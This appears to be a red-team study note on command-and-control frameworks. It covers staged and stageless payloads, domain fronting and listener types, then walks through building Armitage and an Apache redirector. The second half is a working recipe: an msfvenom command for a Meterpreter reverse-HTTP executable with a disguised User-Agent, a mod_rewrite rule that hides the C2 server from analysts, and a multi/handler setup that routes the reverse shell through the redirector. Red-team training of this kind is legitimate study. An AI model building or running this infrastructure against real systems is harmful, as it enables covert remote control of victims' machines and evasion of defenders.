C2 Framework Parts
------------------
C2 Server
Agents / Payloads                        
Listeners
Beacons


Agents / Payloads
    Payload Types (Stageless & Staged)
    
        Stageless Payloads (Simplest) they contain the full C2 agent and will call back to the C2 server and begin beaconing immediately.
                                1. The Victim downloads and executes the Dropper
                                2. The beaconing to the C2 Server begins
                                
        Staged Payloads req a callback to the C2 server to download additional parts of the C2 agent. Referred to as a “Dropper” because it is “Dropped” onto the victim machine 
        to download the second stage of our staged payload. Preferred method because small amount of code needs to be written to retrieve the additional parts of the C2 agent 
        from the C2 server. It also makes it easier to obfuscate code to bypass Anti-Virus programs.
                                1. The Victim downloads and executes the "Dropper" 
                                2. The Dropper calls back to the C2 Server for Stage 2
                                3. The C2 Server sends Stage 2 back to the Victim Workstation
                                4. Stage 2 is loaded into memory on the Victim Workstation 
                                5. C2 Beaconing Initializes, and the Red Teamer/Threat Actors can engage with the Victim on the C2 Server.
                                
    Payload Formats
        Some C2 Frameworks support payloads in various other formats, for example:
                PE Files (Executables)
                PowerShell Scripts "Which may contain C# Code and may be compiled and executed with the Add-Type commandlet"
                HTA Files
                JScript Files
                Visual Basic Application/Scripts
                Microsoft Office Documents                        

Modules 
        Post Exploitation modules, are simply modules that deal with anything after the initial point of compromise
        Pivoting Modules, making it easier to access restricted network segments within the C2 Framework
                SMB Beacon for pivoting - 
                        1. The Victims call back to an SMB named pipe on another Victim in a non-restricted network segment.
                        2. The Victim in the non-restricted network segment calls back to the C2 Server over a standard beacon.
                        3. The C2 Server then sends commands back to the Victim in the non-restricted network segment.
                        4. The Victim in the non-restricted network segment then forwards the C2 instructions to the hosts in the restricted segment.
Domain Fronting
                        1. The C2 Operator has a domain that proxies all requests through Cloudflare. 
                        2. The Victim beacons out to the C2 Domain.
                        3. Cloudflare proxies the request, then looks at the Host header and relays the traffic to the correct server.
                        4. The C2 Server then responds to Cloudflare with the C2 Commands.
                        5. The Victim then receives the command from Cloudflare.

This technique goes by several names "NGINX Reverse Proxy", "Apache Mod_Proxy/Mod_Rewrite", "Malleable HTTP C2 Profiles", and others
     All of the Proxy features more or less allow a user to control specific elements of the incoming HTTP request. Let's say an incoming connection request has an 
     "X-C2-Server" header; we could explicitly extract this header using the specific technology that is at your disposal (Reverse Proxy, Mod_Proxy/Rewrite, Malleable
     C2 Profile, etc.) and ensure that your C2 server responds with C2 based responses. Whereas if a normal user queried the HTTP Server, they might see a generic webpage.
     This is all dependent on your configuration.
     
                1. The Victim beacons out to the C2 Server with a custom header in the HTTP request, while a SOC Analyst has a normal HTTP Request
                2. The requests are proxied through Cloudflare
                3. The C2 Server receives the request and looks for the custom header, and then evaluates how to respond based on the C2 Profile.
                4. The C2 Server responds to the client and responds to the Analyst/Compromised device

Free C2 Frameworks (Metasploit, Armitage, Powershell Empire/Starkiller, Covenant, Sliver)
PAID C2 Frameworks (Cobalt Strike, Brute Ratel)

Listener Type
        Standard Listener - 
            These often communicate directly over a raw TCP or UDP socket, sending commands in cleartext
        HTTP/HTTPS Listeners - 
            These often front as some sort of Web Server and use techniques like Domain Fronting or Malleable C2 profiles to mask a C2 server. 
            When specifically communicating over HTTPS, it's less likely for communications to be blocked by an NGFW
        DNS Listener -
            DNS Listeners are a popular technique specifically used in the "exfiltration stage" where additional infrastructure is normally required to be set up, or at the very 
            least, a Domain Name must be purchased and registered, and a public NS server must be configured.These are often very useful for bypassing Network Proxies
        SMB Listener - 
            Communicating via SMB named pipes is a popular method of choice, especially when dealing with a restricted network; it often enables more flexible pivoting with 
            multiple devices talking to each other and only one device reaching back out over a more common protocol like HTTP/HTTPS
------------------------------------------------------------------------------------------------------------------------------------------------
Setup a C2 Server - Setting Up Armitage
------------------------------------------------------------------------------------------------------------------------------------------------
clone the repository 
    $ git clone https://gitlab.com/kalilinux/packages/armitage.git && cd armitage
Buil current release
    $ bash package.sh
release build will be in the ./releases/unix/ folder && check and verify that Armitage was able to be built successfully.
    $ cd ./release/unix/ && ls -la
Preparing our Environment    
    $ systemctl start postgresql && systemctl status postgresql
initialize the Database so that Metasploit can use it. It's important to note that you CAN NOT be the root user when attempting to initialize the Metasploit Database.
    $ msfdb --use-defaults delete
    $ msfdb --use-defaults init
Start Connect to Armitage
    $ cd /opt/armitage/release/unix && ./teamserver YourIP P@ssw0rd123
    $ cd /opt/armitage/release/unix && ./armitage

Command and Control Redirectors 
-------------------------------
A Redirector is a server that "Redirects" HTTP/HTTPS requests based on information within the HTTP Request body. 
In production systems, you may see a "Redirector" in the form of a Load Balancer. This server often runs Apache 2 or NGINX.
We will be leveraging Apache and some of its modules to build a Redirector. 
In Metasploit, set up basic configurations to allow for more advanced configurations for setting up a Redirector. 
Usually, this configuration is set up on multiple hosts; the purpose of this is to hide the true C2 server!!!

How is a Redirector Setup?
Before we dive into configuring a redirector, we must first understand how one is set up; we will be aligning this to the tools we have available, which are Metasploit and 
Apache2. In Apache, we will be leveraging a module called "mod_rewrite" (or the Rewrite module). This module allows us to write rules to forward requests to internal or external
hosts on a server based on specific HTTP headers or content. We will need to use several modules to configure our Redirector. 
The following modules must be enabled:
            rewrite
            proxy
            proxy_http
            headers
Note: you must change the default port that Apache listens on in /etc/apache2/ports.conf. You must do this before starting the Apache 2 service, or it will fail to start.

You can install apache 2 and enable it with the following commands:
$ apt install apache2
$ a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl

Using Meterpreter, you have the ability to config various aspects of the HTTP Request, for example, the User-Agent. It is common for threat actors to make a slight
adjustment to the User-Agent in their C2 HTTP/HTTPS payloads. It's in every HTTP request, and they all more or less look the same, and there is a very good chance a security
analyst may overlook a modified user agent string. For this demonstration, we will generate a Meterpreter Reverse HTTP payload using MSFvenom; then we will inspect the HTTP 
request in Wireshark. 

Generating a Payload with Modified Headers 
$ msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe

After generating the modified executable and transferring it to a victim, open up Wireshark on your host and use the HTTP filter to only view HTTP requests. After it's started 
capturing packets, execute the binary on the victim system. You will notice an HTTP request come in with our modified User-Agent.

Now that we have a field we can control in the HTTP Request, let's create an Apache2 'mod_rewrite' rule that filters on the user agent "NotMeterpreter" and forward it to 
our Metasploit C2 Server.

Modifying the Apache Config File - 
We will be taking the default Apache config and modifying it to our advantage. On Debian based sys,the default config can be found at /etc/apache2/sites-available/000-default.conf

$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'

                                                            <VirtualHost *:80>

                                                                    ServerAdmin webmaster@localhost
                                                                    DocumentRoot /var/www/html

                                                                    <Directory>
                                                                            AllowOverride All
                                                                    </Directory>

                                                                    ErrorLog ${APACHE_LOG_DIR}/error.log
                                                                    CustomLog ${APACHE_LOG_DIR}/access.log combined

                                                            </VirtualHost>
                                                            
Now that we have a general idea of the Apache2 Config file is structured, we must add a few lines to the config file to enable the Rewrite Engine, add a rewrite condition, 
and lastly, pass through the Apache 2 Proxy. This sounds fairly complex, but it's quite simple.

To enable the Rewrite Engine, we must add RewriteEngine On onto a new line in the VirtualHost section.

Now we will be using a Rewrite Condition targeting the HTTP User-Agent. For a complete list of HTTP Request Targets, see the mod_rewrite documentation on Apache.org. 
Because we only want to match the User-Agent "NotMeterpreter", we need to use some basic Regular Expressions to capture this; adding a ^ signals the beginning of a string 
and a $ at the end of the series, giving us with "^NotMeterpreter$". This Regex will only capture the NotMeterpreter User-Agent. 
We can add this line RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$" to our config to (as previously stated) only allow HTTP Requests with the NotMeterpreter user agent
to access Metasploit.

Lastly, we must forward the request through Apache2, through our proxy, to Metasploit. To do this, we must use the ProxyPass feature of Apache's mod_proxy module. To do this, 
we just need to specify the base URI that the request will be forwarded to (in our case, we just need "/"), and the target we want to forward the request to. This will vary 
from setup to set up, but this IP Address will be your C2 server. In the lab scenario, it will be localhost and port that Metasploit is listening on. This will give us a full 
config file that looks like so:

$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
                                                            <VirtualHost *:80>

                                                                ServerAdmin webmaster@localhost
                                                                DocumentRoot /var/www/html

                                                                RewriteEngine On
                                                                RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
                                                                ProxyPass "/" "http://localhost:8080/"

                                                                <Directory>
                                                                    AllowOverride All
                                                                </Directory>

                                                                ErrorLog ${APACHE_LOG_DIR}/error.log
                                                                CustomLog ${APACHE_LOG_DIR}/access.log combined

                                                            </VirtualHost>

Setting Up Exploit/Multi/Handler

To set up Meterpreter properly, we need to make a few modifications; We must set our LHOST argument to the incoming interface that we are expecting connections from,
in our lab; this will be 127.0.0.1. In the real world, this will be your public interface that your Redirector will be connecting to (aka your Public IP Address), and 
the LPORT will be whatever you like. For the lab, we will be using TCP/8080; this can be whatever you like in production. As always, the best practice is to run services 
over their standard protocols, so HTTP should run on port 80, and HTTPS should run on port 443. These options will also need to be duplicated for ReverseListenerBindAddress 
and ReverseListenerBindPort.

Next, we need to set up OverrideLHOST - This value will be your redirector's IP Address or Domain Name. After that, we need to set the OverrideLPORT; this will be the port 
that the HTTP or HTTPS is running on, on your Redirector. Lastly, we must set the OverrideRequestHost to true. This will make Meterpreter respond with the OverrideHost 
information, so all queries go through the Redirector and not your C2 server. Now that you understand what must be configured, let's dive into it:

$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > set ReverseListenerBindAddress 127.0.0.1
msf6 exploit(multi/handler) > set ReverseListenerBindPort 8080
msf6 exploit(multi/handler) > set OverrideLHOST 192.168.0.44
msf6 exploit(multi/handler) > set OverrideLPORT 80
msf6 exploit(multi/handler) > set HttpUserAgent NotMeterpreter
msf6 exploit(multi/handler) > set OverrideRequestHost true
msf6 exploit(multi/handler) > run

After this has all been set up, running your Meterpreter Reverse Shell should now proxy all communications through your Redirector! For awareness, the diagram below is how our
Redirector is set up in our lab; as a reminder, in engagements, you will want to use multiple hosts and DNS records instead of IP Addresses. 

